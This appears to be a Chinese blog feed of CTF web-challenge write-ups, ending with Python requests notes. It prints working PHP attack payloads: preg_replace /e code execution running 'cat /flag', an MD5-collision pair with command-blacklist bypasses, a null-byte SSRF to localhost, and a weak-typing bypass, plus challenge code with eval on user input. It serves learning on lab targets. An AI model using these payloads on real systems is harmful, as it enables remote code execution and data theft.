&#39;strtolower(&quot;\\1&quot;)&#39;,       $str    );&#125;foreach($_GET as $re =&gt; $str) &#123;   echo complex($re, $str). &quot;\n&quot;;&#125;function getFlag()&#123;    @eval($_GET[&#39;cmd&#39;]);&#125;</code></pre><p>这一点，猜测一定要触发getflag（）函数，那么问题的点一定在complex这个函数这里，初步想法是在complex这里构造出来getflag</p><p>先说return preg_replace(<br>           ‘/(‘ . $re . ‘)/ei’,<br>           ‘strtolower(“\1”)’,<br>           $str<br>        );</p><p>preg_replace可能会导致命令执行。</p><pre><code>foreach ($_GET as $regex =&gt; $value) &#123;    preg_replace(&#39;/(&#39; . $regex . &#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;,$value);&#125;</code></pre><p>s_———————————————–{${phpinfo()}}———————————————–{${phpinfo()}} </p><p>可以看到我们输入的是S+但是数出来变成s_</p><p>php自身在解析请求的时候，如果参数名字中包含空格、.、[等字符，会将他们转换成_。</p><p>如果在preg_replace中使用/e修饰符，会将 replacement 参数当作 php 代码，并且以 eval 函数的方式执行，前提是 subject 中有 pattern 的匹配</p><p><img src="1.png"></p><p>图中实际上通过 eval 执行的是 strtolower 函数。分别实际执行的是：</p><p>strtolower(“JUST TEST”);</p><p>strtolower(“PHPINFO()”);</p><p>strtolower(“{${PHPINFO()}}”);</p><p>第三个之所以可以执行代码，是因为我们通过复杂（花括号）语法的方式来让其代码执行。</p><p>回到源代码中，我们再理解一下：</p><pre><code>   foreach ($_GET as $regex =&gt; $value) &#123;    preg_replace(&#39;/(&#39; . $regex . &#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;,$value);&#125;</code></pre><p>这里的 replacement 是 strtolower(“\1”) ，着重理解一下 \1 。</p><p>每个这样的引用将被匹配到的第n个捕获子组捕获到的文本替换。 n可以是0-99，\0和$0代表完整的模式匹配文本。</p><p>这里的 $1$2$4 等同于上面的 \1\2\4 的作用，因此我们看一下是怎么选择匹配的。</p><p>$1 $2   $3 $4<br>‘/(.<em>)(?|&amp;)’ . $key . ‘=[^&amp;]+?(&amp;)(.</em>)/i’</p><p>回到题目</p><p>最后构造<br>?\S*=${getFlag()}&amp;cmd=system(‘cat /flag’);得到flag</p><p>我感觉问题应该是处在file_get_content(),是将整个文件读入到一个字符串中，但是前面我输入的是text=i have a dream，这是字符串不是文件，这是实验时的报错信息 file_get_contents($text): failed to open stream: No such file or directory ，所以要想怎么才能创建一个文件</p><p>php://input 是个可以访问请求的原始数据的只读流。 POST 请求的情况下，最好使用 php://input 来代替 $HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。 而且，这样的情况下 $HTTP_RAW_POST_DATA 默认没有填充， 比激活 always_populate_raw_post_data 潜在需要更少的内存。 enctype=”multipart/form-data” 的时候 php://input 是无效的。 </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>easyweb</title>
      <link href="/2021/02/28/web/"/>
      <url>/2021/02/28/web/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>打开注意到url img=TXpVek5UTTFNbVUzTURabE5qYz0，尝试解码MzUzNTM1MmU3MDZlNjc=，继续3535352e706e67，继续555.png，没有什么用处，当是为什么要重复这么多次，编码3535352E706E67，GM2TGNJTGUZEKNZQGZCTMNY=，这里跟之前不一样了R00yVEdOSlRHVVpFS05aUUdaQ1RNTlk9，但是依旧没有什么用，注意到，当我去掉img的时候，会刷新网页，自动回来，bp试试，注意到响应头：Refresh: 0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=，没用，尝试修改将img修改为，index.php类似555.png的做法</p><p>696E6465782E706870</p><p>GY4TMRJWGQ3DKNZYGJCTOMBWHA3TA===</p><p>R1k0VE1SSldHUTNES05aWUdKQ1RPTUJXSEEzVEE9PT0=</p><p>失败，但是应该就是这样做的</p><p>我在试试555.png，我当时base64，用了两次，base16用来一次</p><p>所以，</p><p>再来</p><p>第一次base16：696E6465782E706870</p><p>第二次base64：Njk2RTY0NjU3ODJFNzA2ODcw</p><p>第三次base64：TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</p><p>注意：PD9waHAKZXJyb3JfcmVwb3J0aW5nKEVfQUxMIHx8IH4gRV9OT1RJQ0UpOwpoZWFkZXIoJ2NvbnRlbnQtdHlwZTp0ZXh0L2h0bWw7Y2hhcnNldD11dGYtOCcpOwokY21kID0gJF9HRVRbJ2NtZCddOwppZiAoIWlzc2V0KCRfR0VUWydpbWcnXSkgfHwgIWlzc2V0KCRfR0VUWydjbWQnXSkpIAogICAgaGVhZGVyKCdSZWZyZXNoOjA7dXJsPS4vaW5kZXgucGhwP2ltZz1UWHBWZWs1VVRURk5iVlV6VFVSYWJFNXFZejAmY21kPScpOwokZmlsZSA9IGhleDJiaW4oYmFzZTY0X2RlY29kZShiYXNlNjRfZGVjb2RlKCRfR0VUWydpbWcnXSkpKTsKCiRmaWxlID0gcHJlZ19yZXBsYWNlKCIvW15hLXpBLVowLTkuXSsvIiwgIiIsICRmaWxlKTsKaWYgKHByZWdfbWF0Y2goIi9mbGFnL2kiLCAkZmlsZSkpIHsKICAgIGVjaG8gJzxpbWcgc3JjID0iLi9jdGYzLmpwZWciPic7CiAgICBkaWUoInhpeGnvvZ4gbm8gZmxhZyIpOwp9IGVsc2UgewogICAgJHR4dCA9IGJhc2U2NF9lbmNvZGUoZmlsZV9nZXRfY29udGVudHMoJGZpbGUpKTsKICAgIGVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL2dpZjtiYXNlNjQsIiAuICR0eHQgLiAiJz48L2ltZz4iOwogICAgZWNobyAiPGJyPiI7Cn0KZWNobyAkY21kOwplY2hvICI8YnI+IjsKaWYgKHByZWdfbWF0Y2goIi9sc3xiYXNofHRhY3xubHxtb3JlfGxlc3N8aGVhZHx3Z2V0fHRhaWx8dml8Y2F0fG9kfGdyZXB8c2VkfGJ6bW9yZXxiemxlc3N8cGNyZXxwYXN0ZXxkaWZmfGZpbGV8ZWNob3xzaHxcJ3xcInxcYHw7fCx8XCp8XD98XFx8XFxcXHxcbnxcdHxccnxceEEwfFx7fFx9fFwofFwpfFwmW15cZF18QHxcfHxcXCR8XFt8XF18e3x9fFwofFwpfC18PHw+L2kiLCAkY21kKSkgewogICAgZWNobygiZm9yYmlkIH4iKTsKICAgIGVjaG8gIjxicj4iOwp9IGVsc2UgewogICAgaWYgKChzdHJpbmcpJF9QT1NUWydhJ10gIT09IChzdHJpbmcpJF9QT1NUWydiJ10gJiYgbWQ1KCRfUE9TVFsnYSddKSA9PT0gbWQ1KCRfUE9TVFsnYiddKSkgewogICAgICAgIGVjaG8gYCRjbWRgOwogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICgibWQ1IGlzIGZ1bm55IH4iKTsKICAgIH0KfQoKPz4KPGh0bWw+CjxzdHlsZT4KICBib2R5ewogICBiYWNrZ3JvdW5kOnVybCguL2JqLnBuZykgIG5vLXJlcGVhdCBjZW50ZXIgY2VudGVyOwogICBiYWNrZ3JvdW5kLXNpemU6Y292ZXI7CiAgIGJhY2tncm91bmQtYXR0YWNobWVudDpmaXhlZDsKICAgYmFja2dyb3VuZC1jb2xvcjojQ0NDQ0NDOwp9Cjwvc3R5bGU+Cjxib2R5Pgo8L2JvZHk+CjwvaHRtbD4=</p><p>应该是源码<br>&lt;?php</p><p>error_reporting(E_ALL || ~ E_NOTICE);</p><p>header(‘content-type:text/html;charset=utf-8’);</p><p>$cmd = $_GET[‘cmd’];</p><p>if (!isset($_GET[‘img’]) || !isset($_GET[‘cmd’])) </p><p>   header(‘Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=’);</p><p>$file = hex2bin(base64_decode(base64_decode($_GET[‘img’])));</p><p>$file = preg_replace(“/[^a-zA-Z0-9.]+/“, “”, $file);</p><p>if (preg_match(“/flag/i”, $file)) {</p><p>   echo ‘<img src ="./ctf3.jpeg">‘;</p><p>   die(“xixi～ no flag”);</p><p>} else {</p><p>   $txt = base64_encode(file_get_contents($file));</p><p>   echo “<img src='data:image/gif;base64," . $txt . "'></img>“;</p><p>   echo “<br>“;<br>}</p><p>echo $cmd;</p><p>echo “<br>“;</p><p>if (preg_match(“/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|&#39;|&quot;|`|;|,|*|?|\|\\|\n|\t|\r|\xA0|{|}|(|)|&amp;[^\d]|@|||\$|[|]|{|}|(|)|-|&lt;|&gt;/i”, $cmd)) {</p><p>   echo(“forbid ~”);</p><p>   echo “<br>“;</p><p>} else {</p><p>   if ((string)$_POST[‘a’] !== (string)$_POST[‘b’] &amp;&amp; md5($_POST[‘a’]) === md5($_POST[‘b’])) {<br>    echo <code>$cmd</code>;<br>   } else {<br>    echo (“md5 is funny ~”);<br>    }<br>}</p><p>?&gt;</p><html><style>  body{   background:url(./bj.png)  no-repeat center center;   background-size:cover;   background-attachment:fixed;   background-color:#CCCCCC;}</style><body></body></html><p>因为要运用到md5函数</p><p>$Param1=”\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2”;<br>$Param2=”\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2”;</p><p>用的a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2<br>&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2<br>成功</p><p>可以看出，查看目录的ls，被过滤，突然想到还有dir也可以查看</p><p>dir%20/，可以看到有flag</p><p>并且，读取文件内容得很多命令都被过滤，并且还有一些绕过手法也被过滤，但是可以看出漏了一个sort，还有uniq，得到flag</p><p>(1)more:一页一页的显示档案内容</p><p>(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页</p><p>(3)head:查看头几行</p><p>(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</p><p>(5)tail:查看尾几行</p><p>(6)nl：显示的时候，顺便输出行号</p><p>(7)od:以二进制的方式读取档案内容</p><p>(8)vi:一种编辑器，这个也可以查看</p><p>(9)vim:一种编辑器，这个也可以查看</p><p>(10)sort:可以查看</p><p>(11)uniq:可以查看</p><p>(12)file -f:报错出具体内容</p><p>现在有点不大懂得是，我看其他人的wp使用的是ca\t /flag,但是\不是被过滤了嘛</p><p>先看这段代码</p><p>$cmd=’\‘;</p><p>if (preg_match(‘/?|\|\\‘,$cmd)){</p><p>   echo(‘nonono’);</p><p>}</p><p>else{</p><p>   echo(‘yes’);</p><p>}</p><p>输出yes，就是没有过滤\</p><p>问题出现在前面的两个\，因为正则表达式是通过了两层解析，一层是php的，一层是正则的</p><p>前面两个\，经过php解析器解析后成为了\，|因为是php中的保留符号，所以需要一个转义\来匹配，所以猜测应该就对|\的匹配，尝试，输入$cmd=|\,yes</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GKCVE，actf backupfile</title>
      <link href="/2021/02/28/GKCVE/"/>
      <url>/2021/02/28/GKCVE/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>题目地址：<a href="http://4a33f32c-6c18-4ed6-90da-d9700899205b.node3.buuoj.cn/">http://4a33f32c-6c18-4ed6-90da-d9700899205b.node3.buuoj.cn</a></p><p>打开题目vint，提示是cve 2020 7066</p><p>上网查资料</p><p>get_headers(url)，获取url的头信息，以数组的形式返回</p><p>还有get_headers(url,1)</p><pre><code>&lt;?php$url = &#39;http://4a33f32c-6c18-4ed6-90da-d9700899205b.node3.buuoj.cn/?url=www.ctfhub.com&#39;;print_r(get_headers($url));print_r(&#39;--------------------------------------------------------------------------------&#39;);print_r(get_headers($url, 1));?&gt;</code></pre><p>从返回信息中，可以看出两者的区别</p><p>Array ( [0] =&gt; HTTP/1.1 200 OK [1] =&gt; Server: openresty [2] =&gt; Date: Sun, 28 Feb 2021 04:29:27 GMT [3] =&gt; Content-Type: text/html; charset=UTF-8 [4] =&gt; Connection: close [5] =&gt; Hint: Flag in localhost [6] =&gt; Tips: Host must be end with ‘123’ [7] =&gt; Vary: Accept-Encoding [8] =&gt; X-Powered-By: PHP/7.3.15 ) ——————————————————————————–Array ( [0] =&gt; HTTP/1.1 200 OK [Server] =&gt; openresty [Date] =&gt; Sun, 28 Feb 2021 04:29:27 GMT [Content-Type] =&gt; text/html; charset=UTF-8 [Connection] =&gt; close [Hint] =&gt; Flag in localhost [Tips] =&gt; Host must be end with ‘123’ [Vary] =&gt; Accept-Encoding [X-Powered-By] =&gt; PHP/7.3.15 ) </p><p>并且，可以通过\0（不知道为啥，在我电脑上\0使用不了，用的是%00，就相当于%00截断）进行阶段，比如我们输入url=‘http：//127.0.0.1%00<a href="http://www.ctfhub.com’,实际上得到的是http：//127.0.0.1">www.ctfhub.com’,实际上得到的是http：//127.0.0.1</a></p><h2>回到题目</h2><p>我们点开那个ctfhub之后就是很长的一段数组，没什么头绪，里面没什么提示，我想，他的源码应该是 url=$_GET[‘url’],get_headers(url),然后我就尝试在本地测试</p><pre><code>&lt;?php$url = &#39;http://4a33f32c-6c18-4ed6-90da-d9700899205b.node3.buuoj.cn/?url=www.ctfhub.com&#39;;print_r(get_headers($url));print_r(&#39;--------------------------------------------------------------------------------&#39;);print_r(get_headers($url, 1));</code></pre><p>得到提示，其实这个就是得到它的请求标头，其实可以抓包后进行查看，hint：flag in localhost tips:host 必需是123 结尾</p><p>输入<a href="http://4a33f32c-6c18-4ed6-90da-d9700899205b.node3.buuoj.cn/?url=http%EF%BC%9A//127.0.0.123%00www.ctfhub.com&#39;%EF%BC%8C%E5%BE%97%E5%88%B0flag%EF%BC%8C%E5%B9%B6%E4%B8%94%E6%88%91%E5%86%99%E7%9A%84%E6%97%B6%E5%80%99%E5%9B%A0%E4%B8%BA%E6%8F%90%E7%A4%BA%E7%9A%84%E6%98%AF%E8%AF%B4localhost%EF%BC%8C%E6%88%91%E5%B0%B1%E5%86%99%E7%9A%84http://4a33f32c-6c18-4ed6-90da-d9700899205b.node3.buuoj.cn/?url=http://localhost%00www.ctfhub.com&#39;,%E4%BD%86%E6%98%AF%E9%82%A3%E4%B8%AA123%EF%BC%8C%E6%88%91%E4%B8%8D%E7%9F%A5%E9%81%93%E8%AF%A5%E6%80%8E%E4%B9%88%E5%8A%9E%E4%BA%86%EF%BC%8C%E6%88%91%E5%8F%88%E6%83%B3%E8%AF%B4%E6%98%AF%E5%9C%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%E4%B8%ADhost%E4%BF%AE%E6%94%B9%E4%BB%A5123%EF%BC%8C%E7%BB%93%E5%B0%BE%E6%89%8D%E5%8F%91%E7%8E%B0%E4%B8%8D%E6%98%AF%EF%BC%8C%E5%B0%B1%E7%9B%B4%E6%8E%A5127.0.0.123%EF%BC%8Cok">http://4a33f32c-6c18-4ed6-90da-d9700899205b.node3.buuoj.cn/?url=http：//127.0.0.123%00www.ctfhub.com&#39;，得到flag，并且我写的时候因为提示的是说localhost，我就写的http://4a33f32c-6c18-4ed6-90da-d9700899205b.node3.buuoj.cn/?url=http://localhost%00www.ctfhub.com&#39;,但是那个123，我不知道该怎么办了，我又想说是在请求头中host修改以123，结尾才发现不是，就直接127.0.0.123，ok</a></p><h1>actf backupfile</h1><p>因为说是备份文件，我就是了下index.php.bak，然后就出来了</p><pre><code>&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET[&#39;key&#39;])) &#123;$key = $_GET[&#39;key&#39;];if(!is_numeric($key)) &#123;    exit(&quot;Just num!&quot;);&#125;$key = intval($key);$str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;if($key == $str) &#123;    echo $flag;&#125;&#125;else &#123;echo &quot;Try to find out source file!&quot;;&#125;</code></pre><p>这不就是php弱类型，就直接?key=123，就好了</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>秋名山车神</title>
      <link href="/2021/02/26/%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/"/>
      <url>/2021/02/26/%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>import requests<br>import bs4</p><p>url=’your url’<br>session=requests.session()</p><p>re=session.get(url)</p><p>content=re.content</p><p>res=bs4.BeautifulSoup(content,’lxml’)</p><p>res=str(res.find(‘div’)).split(‘=’)[0].split(‘&gt;’)[1]</p><p>value=eval(res)</p><p>data={‘value’:value}</p><p>rep=requests.get(‘yoururl’,data=data)</p><p>print(rep.text)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>request</title>
      <link href="/2021/02/26/request/"/>
      <url>/2021/02/26/request/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>陆陆续续学习了一些python的基础知识，感觉有必要开始对模块的学习了</p><h1>模块说明</h1><p>requesr支持http连接保持和连接池，支持使用cookie来保持会话，支持文件上传，支持相应内容自动编码，支持国际化的url和post数据自动连接</p><p>在python内置模块中进行了高度的封装，使python在进行网络请求的时候，可以轻而易举地完成浏览器的所有操作</p><p>requests会自动实现持久连接，keep alive</p><h1>基础入门</h1><h2>导入模块</h2><p>import requests</p><h2>发送简洁的请求</h2>示例：获得一个个人网页<p>import requests</p><p>r=requests.get(‘<a href="https://ckylsy.github.io/&#39;)(%E4%B8%8D%E5%B8%A6%E5%8F%82%E6%95%B0)">https://ckylsy.github.io/&#39;)(不带参数)</a><br>r1=requests.get(url=’<a href="http://dict.baidu.com/s&#39;">http://dict.baidu.com/s&#39;</a>, params={‘wd’: ‘python’})(<a href="http://dict.baidu.com/s?wd=python">http://dict.baidu.com/s?wd=python</a>)</p><p>我们可以使用该方法使用以下各种方法</p><p>1   requests.get(‘<a href="https://github.com/timeline.json%E2%80%99">https://github.com/timeline.json’</a>)                                # GET请求</p><p>2   requests.post(“<a href="http://httpbin.org/post%E2%80%9D">http://httpbin.org/post”</a>)                                        # POST请求</p><p>3   requests.put(“<a href="http://httpbin.org/put%E2%80%9D">http://httpbin.org/put”</a>)                                          # PUT请求</p><p>4   requests.delete(“<a href="http://httpbin.org/delete%E2%80%9D">http://httpbin.org/delete”</a>)                                    # DELETE请求</p><p>5   requests.head(“<a href="http://httpbin.org/get%E2%80%9D">http://httpbin.org/get”</a>)                                         # HEAD请求</p><p>6   requests.options(“<a href="http://httpbin.org/get%E2%80%9D">http://httpbin.org/get”</a> )                                     # OPTIONS请求</p><h2>为url传递参数</h2><p>url_params={‘key’:’python’}   #字典传递参数，如果是值为none的键不会被添加到url中<br>r=requests.get(‘your_url’,params=url_params)</p><p>r=your url？key =value</p><h2>响应内容</h2><p>r.encoding:获得当前编码</p><p>r.encoding=‘utf-8’设置编码</p><p>r.text:以encoding解析返回内容，如果是字符串的消息体，则根据响应头的编码进行解码</p><p>r.content:以字节形势（二进制）来发挥内容，字节方式的响应体会自动为你解码，gzip和deflaste进行压缩</p><p>r.headers:以字典的方式返回响应体，这个字典的键不区分大小写，如果键不存在则2返回none</p><p>r.status_code:返回状态码，其实直接输入print（r）就可以的得到</p><p>r.raw:返回原始响应体，即urllib的response对象，使用r.raw.read()</p><p>r.ok:返回bool值，便可查看是否登陆成功</p><p>r.json():requests中的内置json解码器，以json的形式返回，前提是返回的内容使json格式的，否则会抛出异常</p><p>r.raise_for_status():失败请求抛出异常</p><p>post发出json请求</p><p> import requests</p><p> import json</p><p> r = requests.post(‘<a href="https://api.github.com/some/endpoint&#39;">https://api.github.com/some/endpoint&#39;</a>, data=json.dumps({‘some’: ‘data’}))</p><p> print(r.json()</p><h2>定制头和cookie信息</h2><p>header={‘user-agent’:’my-app/0.01’}</p><p>cookie={‘key’:’value’}</p><p>r=requests.get/post(‘your url’,hear)<br>//<br>data={‘some’:’data’}</p><p>headers={‘content-type’: ‘application/json’,’User-Agent’: ‘Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0’}</p><p>r = requests.post(‘<a href="https://api.github.com/some/endpoint&#39;">https://api.github.com/some/endpoint&#39;</a>, data=data, headers=headers)</p><p>print(r.text)</p><h2>响应</h2><p>r.headers:返回字典类型，头信息</p><p>r.requests.headers:返回发送到服务器的头信息</p><p>测试了一下：{‘User-Agent’: ‘python-requests/2.25.1’, ‘Accept-Encoding’: ‘gzip, deflate’, ‘Accept’: ‘<em>/</em>‘, ‘Connection’: ‘keep-alive’} r.requests.headers<br>{‘Server’: ‘nginx’, ‘Date’: ‘Fri, 26 Feb 2021 06:04:34 GMT’, ‘Content-Type’: ‘text/html’, ‘Transfer-Encoding’: ‘chunked’, ‘Connection’: ‘keep-alive’, ‘Vary’: ‘Accept-Encoding’, ‘Content-Encoding’: ‘gzip’} r.headers</p><p>r.cookies 返回cookie</p><p>r.history 返回重定向信息，当然可以在请求头上加上allow_redirects=false阻止重定向</p><h2>超时</h2>r=requests.gets('url',timeout=1)设置秒数超时，仅对于连接有效<h2>会话对象，能够跨请求保持参数</h2>s=requests.session()<p>s.auth=(‘auth’,’passwd’)</p><p>s.headers=(‘key’:’value’)</p><p>r=s.get(‘url’)</p><p>r=s.get(‘url1’)</p><h2>代理</h2><p>proxies={‘http’:’ip1’,’https’:’ip2’}</p><p>requests.get(‘url’,proxies=proxies)</p><h2>汇总</h2><h1 id="HTTP请求类型"><a href="#HTTP请求类型" class="headerlink" title="HTTP请求类型"></a>HTTP请求类型</h1><h1 id="get类型"><a href="#get类型" class="headerlink" title="get类型"></a>get类型</h1><p>r = requests.get(‘<a href="https://github.com/timeline.json&#39;">https://github.com/timeline.json&#39;</a>)</p><h1 id="post类型"><a href="#post类型" class="headerlink" title="post类型"></a>post类型</h1><p>r = requests.post(“<a href="http://m.ctrip.com/post&quot;">http://m.ctrip.com/post&quot;</a>)</p><h1 id="put类型"><a href="#put类型" class="headerlink" title="put类型"></a>put类型</h1><p>r = requests.put(“<a href="http://m.ctrip.com/put&quot;">http://m.ctrip.com/put&quot;</a>)</p><h1 id="delete类型"><a href="#delete类型" class="headerlink" title="delete类型"></a>delete类型</h1><p>r = requests.delete(“<a href="http://m.ctrip.com/delete&quot;">http://m.ctrip.com/delete&quot;</a>)</p><h1 id="head类型"><a href="#head类型" class="headerlink" title="head类型"></a>head类型</h1><p>r = requests.head(“<a href="http://m.ctrip.com/head&quot;">http://m.ctrip.com/head&quot;</a>)</p><h1 id="options类型"><a href="#options类型" class="headerlink" title="options类型"></a>options类型</h1><p>r = requests.options(“<a href="http://m.ctrip.com/get&quot;">http://m.ctrip.com/get&quot;</a>)</p><h1 id="获取响应内容"><a href="#获取响应内容" class="headerlink" title="获取响应内容"></a>获取响应内容</h1><p>print(r.content) #以字节的方式去显示，中文显示为字符</p><p>print(r.text) #以文本的方式去显示</p><p>#URL传递参数<br>payload = {‘keyword’: ‘香港’, ‘salecityid’: ‘2’}<br>r = requests.get(“<a href="http://m.ctrip.com/webapp/tourvisa/visa_list&quot;">http://m.ctrip.com/webapp/tourvisa/visa_list&quot;</a>, params=payload)<br>print（r.url） #示例为<a href="http://m.ctrip.com/webapp/tourvisa/visa_list?salecityid=2&amp;keyword=%E9%A6%99%E6%B8%AF">http://m.ctrip.com/webapp/tourvisa/visa_list?salecityid=2&amp;keyword=香港</a></p><p>#获取/修改网页编码<br>r = requests.get(‘<a href="https://github.com/timeline.json&#39;">https://github.com/timeline.json&#39;</a>)</p><p>print （r.encoding）</p><p>#json处理<br>r = requests.get(‘<a href="https://github.com/timeline.json&#39;">https://github.com/timeline.json&#39;</a>)</p><p>print（r.json()） # 需要先import json    </p><h1 id="定制请求头"><a href="#定制请求头" class="headerlink" title="定制请求头"></a>定制请求头</h1><p>url = ‘<a href="http://m.ctrip.com&/#39;">http://m.ctrip.com&#39;</a></p><p>headers = {‘User-Agent’ : ‘Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 4 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19’}</p><p>r = requests.post(url, headers=headers)</p><p>print （r.request.headers)</p><p>#复杂post请求<br>url = ‘<a href="http://m.ctrip.com&/#39;">http://m.ctrip.com&#39;</a></p><p>payload = {‘some’: ‘data’}</p><p>r = requests.post(url, data=json.dumps(payload)) #如果传递的payload是string而不是dict，需要先调用dumps方法格式化一下</p><h1 id="post多部分编码文件"><a href="#post多部分编码文件" class="headerlink" title="post多部分编码文件"></a>post多部分编码文件</h1><p>url = ‘<a href="http://m.ctrip.com&/#39;">http://m.ctrip.com&#39;</a></p><p>files = {‘file’: open(‘report.xls’, ‘rb’)}</p><p>r = requests.post(url, files=files)</p><h1 id="响应状态码"><a href="#响应状态码" class="headerlink" title="响应状态码"></a>响应状态码</h1><p>r = requests.get(‘<a href="http://m.ctrip.com&/#39;">http://m.ctrip.com&#39;</a>)</p><p>print(r.status_code)</p><h1 id="响应头"><a href="#响应头" class="headerlink" title="响应头"></a>响应头</h1><p>r = requests.get(‘<a href="http://m.ctrip.com&/#39;">http://m.ctrip.com&#39;</a>)</p><p>print (r.headers)</p><p>print (r.headers[‘Content-Type’])</p><p>print (r.headers.get(‘content-type’)) #访问响应头部分内容的两种方式</p><h1 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h1><p>url = ‘<a href="http://example.com/some/cookie/setting/url&#39;">http://example.com/some/cookie/setting/url&#39;</a></p><p>r = requests.get(url)</p><p>r.cookies[‘example_cookie_name’]    #读取cookies</p><p>url = ‘<a href="http://m.ctrip.com/cookies&#39;">http://m.ctrip.com/cookies&#39;</a></p><p>cookies = dict(cookies_are=’working’)</p><p>r = requests.get(url, cookies=cookies) #发送cookies</p><p>#设置超时时间<br>r = requests.get(‘<a href="http://m.ctrip.com&/#39;">http://m.ctrip.com&#39;</a>, timeout=0.001)</p><p>#设置访问代理<br>proxies = {<br>           “http”: “<a href="http://10.10.1.10:3128&quot;">http://10.10.1.10:3128&quot;</a>,<br>           “https”: “<a href="http://10.10.1.100:4444&quot;">http://10.10.1.100:4444&quot;</a>,<br>          }</p><p>r = requests.get(‘<a href="http://m.ctrip.com&/#39;">http://m.ctrip.com&#39;</a>, proxies=proxies)</p><p>#如果代理需要用户名和密码，则需要这样：</p><p>proxies = {<br>    “http”: “<a href="http://user:pass@10.10.1.10:3128/&quot;">http://user:pass@10.10.1.10:3128/&quot;</a>,<br>}</p><h2>代码示例</h2><h1 id="1、无参数实例"><a href="#1、无参数实例" class="headerlink" title="1、无参数实例"></a>1、无参数实例</h1><p>import requests</p><p>ret = requests.get(‘<a href="https://github.com/timeline.json&#39;">https://github.com/timeline.json&#39;</a>)</p><p>print(ret.url)<br>print(ret.text)</p><h1 id="2、有参数实例"><a href="#2、有参数实例" class="headerlink" title="2、有参数实例"></a>2、有参数实例</h1><p>import requests</p><p>payload = {‘key1’: ‘value1’, ‘key2’: ‘value2’}</p><p>ret = requests.get(“<a href="http://httpbin.org/get&quot;">http://httpbin.org/get&quot;</a>, params=payload)</p><p>print(ret.url)</p><p>print(ret.text)</p><h1 id="1、基本POST实例"><a href="#1、基本POST实例" class="headerlink" title="1、基本POST实例"></a>1、基本POST实例</h1><p>import requests</p><p>payload = {‘key1’: ‘value1’, ‘key2’: ‘value2’}</p><p>ret = requests.post(“<a href="http://httpbin.org/post&quot;">http://httpbin.org/post&quot;</a>, data=payload)</p><p>print(ret.text)</p><h1 id="2、发送请求头和数据实例"><a href="#2、发送请求头和数据实例" class="headerlink" title="2、发送请求头和数据实例"></a>2、发送请求头和数据实例</h1><p>import requests</p><p>import json</p><p>url = ‘<a href="https://api.github.com/some/endpoint&#39;">https://api.github.com/some/endpoint&#39;</a></p><p>payload = {‘some’: ‘data’}</p><p>headers = {‘content-type’: ‘application/json’}</p><p>ret = requests.post(url, data=json.dumps(payload), headers=headers)</p><p>print(ret.text)</p><p>print(ret.cookies)</p><p>#! /usr/bin/python3<br>    import requests</p><pre><code>import jsonclass url_request():def __init__(self):    &#39;&#39;&#39; init &#39;&#39;&#39;if __name__ == &#39;__main__&#39;:heard = &#123;&#39;Content-Type&#39;: &#39;application/json&#39;&#125;payload = &#123;&#39;CountryName&#39;: &#39;中国&#39;,           &#39;ProvinceName&#39;: &#39;四川省&#39;,           &#39;L1CityName&#39;: &#39;chengdu&#39;,           &#39;L2CityName&#39;: &#39;yibing&#39;,           &#39;TownName&#39;: &#39;&#39;,           &#39;Longitude&#39;: 